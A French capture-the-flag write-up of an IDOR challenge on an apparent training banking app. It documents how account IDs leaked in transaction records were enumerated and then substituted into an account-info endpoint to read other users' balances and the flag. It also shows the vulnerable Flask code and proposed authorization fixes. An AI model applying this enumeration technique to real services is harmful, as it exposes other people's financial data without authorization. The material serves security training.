# IDOR Challenge - Task 1 - Documentation

## 🎯 Objectif
Énumérer les account numbers et accéder aux balances des comptes pour trouver le flag.

---

## 🔍 Méthodologie Utilisée

### 1. **Récupération des Account IDs**

#### A. Depuis ton profil utilisateur
```
GET http://web0x06.hbtn/api/customer/info/me
```

**Réponse :**
```json
{
  "id": "8cb0fac7d4174ab9b983777098e6b61a",
  "username": "yosri",
  "accounts_id": [
    "f6be9486c9ea4bdc9701874491457403",
    "3eede4688a7a4f828f91e7c16a2b9710"
  ],
  "total_balance": 2194.7
}
```

#### B. Depuis les transactions
```
GET http://web0x06.hbtn/api/customer/transactions
```

**Données importantes récupérées :**
```json
{
  "transaction_id": "f535dc5824c44387a0cc6241685c7cf3",
  "merchant_name": "Linda Robinson",
  "receiver_id": "26bc8605ef5e444583cb7cb57c008248",
  "receiver_payment_id": "cd8ec0cf192248139a66f57a74e204cd",
  "sender_id": "8cb0fac7d4174ab9b983777098e6b61a",
  "sender_payment_id": "f6be9486c9ea4bdc9701874491457403"
}
```

**Points clés :**
- `receiver_payment_id` et `sender_payment_id` sont des **account IDs**
- Chaque transaction expose les account IDs d'autres utilisateurs
- Permet l'énumération complète des comptes

#### C. Depuis les contacts/utilisateurs
```
GET http://web0x06.hbtn/api/customer/contacts
```
→ Liste de tous les user IDs

Pour chaque user ID :
```
GET http://web0x06.hbtn/api/customer/info/{user_id}
```
→ Récupère leurs `accounts_id[]`

---

## 🔓 Exploitation IDOR - Accès aux Account Balances

### Endpoint Découvert

**Format correct :**
```
GET http://web0x06.hbtn/api/accounts/info/{account_id}
```

**Note importante :** L'account ID est dans le **chemin** de l'URL, pas en paramètre query.

---

### Processus d'Exploitation

#### Étape 1 : Compilation des Account IDs

**Sources :**
1. Transactions (`/api/customer/transactions`) :
   - Tous les `receiver_payment_id`
   - Tous les `sender_payment_id`

2. Profils utilisateurs (`/api/customer/info/{user_id}`) :
   - `accounts_id[]` de chaque utilisateur

**Account IDs collectés :**
```
f6be9486c9ea4bdc9701874491457403  ← Ton account 1
3eede4688a7a4f828f91e7c16a2b9710  ← Ton account 2
cd8ec0cf192248139a66f57a74e204cd  ← Account de Linda Robinson
c962c1e9ca0246ca82e945a40f119572  ← Account cible (contient le flag)
... (autres accounts des transactions)
```

#### Étape 2 : Test de l'Endpoint

**Test avec ton propre account (baseline) :**
```
GET http://web0x06.hbtn/api/accounts/info/f6be9486c9ea4bdc9701874491457403
```

**Résultat attendu :**
```json
{
  "account_id": "f6be9486c9ea4bdc9701874491457403",
  "owner": "Yosri Musk",
  "balance": 2194.7,
  "status": "active"
}
```

#### Étape 3 : Exploitation IDOR

**Test avec un account d'un autre utilisateur :**
```
GET http://web0x06.hbtn/api/accounts/info/cd8ec0cf192248139a66f57a74e204cd
```

**Résultat :**
- ✅ Accès réussi aux données d'un autre utilisateur
- Aucune vérification d'autorisation
- **IDOR confirmé !**

#### Étape 4 : Énumération Complète

**Pour chaque `receiver_payment_id` trouvé dans les transactions :**
```bash
# Account de Linda Robinson
GET /api/accounts/info/cd8ec0cf192248139a66f57a74e204cd

# Account cible contenant le flag
GET /api/accounts/info/c962c1e9ca0246ca82e945a40f119572

# Autres accounts...
```

---

## 🚩 Flag Découvert

### Account Cible
```
Account ID: c962c1e9ca0246ca82e945a40f119572
```

**Requête :**
```
GET http://web0x06.hbtn/api/accounts/info/c962c1e9ca0246ca82e945a40f119572
```

**Réponse contenant le flag :**
```json
{
  "account_id": "c962c1e9ca0246ca82e945a40f119572",
  "owner": "...",
  "balance": ...,
  "flag": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
}
```

### Flag
```
[Ton flag ici]
```

**Source :** Cet account ID a été trouvé comme `receiver_payment_id` dans les transactions.

---

## 📋 Structure de l'Exploitation

### 1. Énumération des Account Numbers

**Méthode :**
```
Transactions → receiver_payment_id & sender_payment_id → Account IDs
```

**Exemple de flux :**
```
1. GET /api/customer/transactions
2. Extrais tous les receiver_payment_id :
   - cd8ec0cf192248139a66f57a74e204cd
   - c962c1e9ca0246ca82e945a40f119572
   - ...
3. Pour chaque account ID trouvé :
   GET /api/accounts/info/{account_id}
```

### 2. Divulgation des Balances (IDOR)

**Vulnérabilité :**
```
Endpoint: /api/accounts/info/{account_id}
Méthode: GET
Paramètre vulnérable: account_id dans le chemin

Exploitation:
- Aucune vérification d'autorisation
- N'importe quel utilisateur authentifié peut accéder à n'importe quel compte
- Simple remplacement de l'account_id dans l'URL
```

---

## 🔧 Outils et Techniques

### Browser DevTools

**Configuration :**
```
F12 → Network tab
✅ Preserve log activé
✅ Filtre XHR/Fetch
```

**Utilisation :**
1. Navigue dans l'application (transactions, transferts)
2. Observe les requêtes API
3. Identifie les account IDs dans les réponses
4. Note les endpoints utilisés
5. Teste manuellement en changeant l'URL

### Burp Suite

**Workflow :**
```
1. Proxy → HTTP History
2. Filtre par "accounts" ou "transactions"
3. Trouve une requête GET vers /api/accounts/info/{id}
4. Send to Repeater
5. Change l'account_id dans le chemin
6. Send et analyse la réponse
7. Cherche le flag dans les champs JSON
```

---

## 🛡️ Analyse de Sécurité

### Vulnérabilités Identifiées

#### 1. IDOR sur Account Info
```python
# ❌ Code vulnérable
@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    # Pas de vérification si l'utilisateur est propriétaire du compte
    account = database.get_account(account_id)
    return jsonify(account)
```

**Impact :**
- Accès non autorisé aux balances de tous les comptes
- Divulgation d'informations financières sensibles
- Énumération complète des comptes utilisateurs

#### 2. Information Disclosure via Transactions
```
Endpoint: /api/customer/transactions
Problème: Expose les account IDs (receiver_payment_id) des autres utilisateurs
Impact: Facilite l'énumération pour l'exploitation IDOR
```

### Corrections Recommandées

#### Fix 1 : Contrôle d'Autorisation
```python
# ✅ Code sécurisé
@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    current_user_id = session.get('user_id')
    
    # Vérifier que l'utilisateur possède ce compte
    account = database.get_account(account_id)
    
    if not account:
        return {'error': 'Account not found'}, 404
    
    # Vérifier l'autorisation
    if account.owner_id != current_user_id:
        return {'error': 'Unauthorized access'}, 403
    
    return jsonify(account)
```

#### Fix 2 : Références Indirectes
```python
# Utiliser des références indirectes au lieu d'IDs directs
# Mapping: public_reference → internal_account_id

@app.route('/api/accounts/info/<public_ref>')
@login_required
def get_account_info(public_ref):
    current_user_id = session.get('user_id')
    
    # Résoudre la référence
    account_id = reference_mapping.get(public_ref, current_user_id)
    
    # Vérifier l'autorisation
    if not user_has_access(current_user_id, account_id):
        return {'error': 'Unauthorized'}, 403
    
    account = database.get_account(account_id)
    return jsonify(account)
```

#### Fix 3 : Filtrage des Transactions
```python
# Masquer les account IDs dans les transactions
@app.route('/api/customer/transactions')
@login_required
def get_transactions():
    user_id = session.get('user_id')
    transactions = database.get_user_transactions(user_id)
    
    # Masquer les account IDs sensibles
    for trans in transactions:
        if trans['sender_id'] != user_id:
            trans['sender_payment_id'] = '***MASKED***'
        if trans['receiver_id'] != user_id:
            trans['receiver_payment_id'] = '***MASKED***'
    
    return jsonify(transactions)
```

---

## 🎓 Leçons Apprises

### Points Clés

1. **L'authentification n'est PAS l'autorisation**
   - Être connecté ne signifie pas avoir accès à toutes les ressources
   - Chaque endpoint doit vérifier les droits d'accès

2. **Les UUIDs ne protègent pas contre l'IDOR**
   - Même si les IDs ne sont pas séquentiels
   - Si les IDs sont exposés ailleurs (transactions), ils peuvent être énumérés

3. **Les fuites d'information facilitent l'exploitation**
   - Les transactions exposent les account IDs
   - Combiné avec l'IDOR, cela permet un accès complet

4. **L'énumération est possible via plusieurs vecteurs**
   - Transactions
   - Profils utilisateurs
   - Listes de contacts
   - Historiques

### Techniques de Découverte

1. **Analyse des transactions** → Source d'IDs
2. **Test des endpoints REST** → Pattern `/resource/{id}`
3. **Observation du comportement de l'app** → Transferts révèlent la structure
4. **Manipulation systématique des IDs** → Test avec d'autres valeurs

---

## 📊 Statistiques de l'Exploitation

```
Endpoints découverts:
- /api/customer/info/{user_id}        ← User info
- /api/customer/contacts              ← Liste users
- /api/customer/transactions          ← Source d'account IDs
- /api/accounts/info/{account_id}     ← Endpoint vulnérable IDOR

Account IDs énumérés: Multiple (via transactions)
Accès non autorisé: ✅ Réussi
Flag obtenu: ✅ Via account c962c1e9ca0246ca82e945a40f119572
```

---

**Challenge complété avec succès ! 🎉**

Flag Task 1: `[Insère ton flag ici]`
